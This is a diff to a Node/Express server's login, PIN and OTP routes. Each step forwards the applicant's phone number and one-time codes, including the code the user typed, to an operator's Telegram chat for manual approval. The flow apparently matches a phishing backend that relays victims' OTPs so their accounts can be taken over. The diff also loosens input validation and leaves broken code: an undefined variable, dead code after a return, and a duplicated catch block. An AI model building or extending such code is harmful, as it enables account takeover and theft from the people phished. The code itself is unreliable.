@@ -287,13 +287,13 @@ app.post('/api/login', async (req, res) => {
       return res.json({ authenticated: true, status: 'pending', applicationId: row.id, message: 'Your application is awaiting admin approval.' });
     }
 
-    / --- NEW OTP LOGIC ---
-    const otpCode = String(crypto.randomInt(100000, 999999));
-    
-    await pool.query(
-      `UPDATE applications SET otp_code=$1, otp_status='pending', otp_created_at=NOW() WHERE id=$2`,
-      [otpCode, row.id]
-    );
+    // PIN verified successfully, send to OTP page
+return res.status(202).json({
+  authenticated: false,
+  status: 'pending_otp',
+  applicationId: row.id,
+  message: 'PIN verified successfully! Please enter the OTP sent to your phone.'
+});
 
     await notifyAdmin(
       `🔐 OTP VERIFICATION REQUEST\nApplication ID: ${row.id}\nApplicant Phone: ${row.phone}\nOTP Code: ${otpCode}\n\nApprove to let the user complete their login.`,
@@ -314,7 +314,7 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-/ VERIFY OTP ROUTE
+// VERIFY OTP ROUTE
 
 // CHECK APPLICATION STATUS
 
@@ -450,7 +450,7 @@ async function processTelegramUpdate(update) {
   }
 
   if (callback) {
-    const match = /^(approve|reject|pinapprove|pinreject|otpapprove|otpreject):([0-9a-f-]{36})$/i.exec(callback.data || '');
+    const match = /^(approve|reject|pinapprove|pinreject|otpapprove|otpreject):(.+)$/i.exec(callback.data || '');
     
     if (!match) {
       await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: 'Unknown action.' }).catch(() => {});
@@ -537,21 +537,22 @@ app.post('/api/verify-otp', async (req, res) => {
     const message = `🔐 *User Entered OTP* 🔐\n\n📱 Phone: ${phone}\n🔑 Code: *${otp}*\n\nApprove this login?`;
     
     try {
-        await telegramApi('sendMessage', {
-            await telegramApi('sendMessage', {
-    chat_id: ADMIN_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    inline_keyboard: [
-    [
-        { text: "✅ Approve OTP", callback_data: `otpapprove:${phone}` }, 
-        { text: "❌ Reject OTP", callback_data: `otpreject:${phone}` }
-    ]
-]
-            }
-        });
+    await telegramApi('sendMessage', {
+        chat_id: ADMIN_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "✅ Approve OTP", callback_data: `otpapprove:${phone}` }, 
+                    { text: "❌ Reject OTP", callback_data: `otpreject:${phone}` }
+                ]
+            ]
+        }
+    });
+} catch (error) {
+    console.error("Failed to send Telegram OTP:", error);
+      }
     } catch (error) {
         console.error("Failed to send Telegram OTP:", error);
     }
